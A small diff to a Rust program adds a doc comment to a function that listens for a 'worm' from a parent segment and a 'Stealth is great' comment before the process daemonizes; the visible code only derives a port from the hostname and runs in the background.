@@ -220,6 +220,7 @@ fn get_send_port(hostname: &[u8]) -> u64 {
     (hasher.finish() & 0xffff) | 1024
 }
 
+/// Listen for either the initial connection or a worm from parent segment
 fn listen_for_worm() -> Result<Worm, &'static str> {
         let mut buf = vec![0; 50];
         let hostname = gethostname(&mut buf).expect("Error getting hostname")
@@ -291,6 +292,7 @@ fn main() {
                 println!("I don't know what to do anymore - I'll just die..");
             }
         }
+    // Stealth is great
     } else {
         daemonize();
     }
